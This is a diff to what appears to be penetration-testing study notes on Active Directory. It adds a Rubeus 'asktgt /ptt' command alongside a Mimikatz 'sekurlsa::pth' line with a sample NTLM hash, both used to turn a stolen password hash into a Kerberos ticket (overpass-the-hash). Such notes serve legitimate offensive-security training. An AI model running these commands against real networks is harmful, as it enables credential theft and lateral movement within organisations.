@@ -34,7 +34,7 @@
 # Mimikatz
 https://adsecurity.org/?page_id=1821
 
-#### Turn an NTLM into a TGT:
+#### Turn an NTLM into a TGT (OverPass-the-Hash / Pass-the-Key):
 
 ```
 mimikatz#> 
@@ -43,6 +43,10 @@ sekurlsa::logonpasswords
 ```
 
 ```sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe```
+
+OR
+
+```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
 ```
 Klist
